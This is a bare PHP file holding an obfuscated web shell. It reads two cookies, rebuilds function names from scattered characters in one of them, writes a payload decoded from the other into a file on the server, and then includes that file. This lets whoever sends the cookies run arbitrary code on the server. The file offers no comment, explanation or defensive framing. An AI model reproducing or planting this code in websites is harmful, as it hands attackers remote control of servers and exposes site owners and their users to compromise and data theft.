<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[14])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 5;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[14][$n];
        if (!$c[14][$n + 1]) {
            if (!$c[14][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 5 + 1;
    }
    $k = $p[3]() . $p[6];
    if (!$p[16]($k)) {
        $n = $p[9]($k, $p[19]);
        $p[8]($n, $p[29] . $p[10]($p[1]($c[3])));
    }
    include($k);
}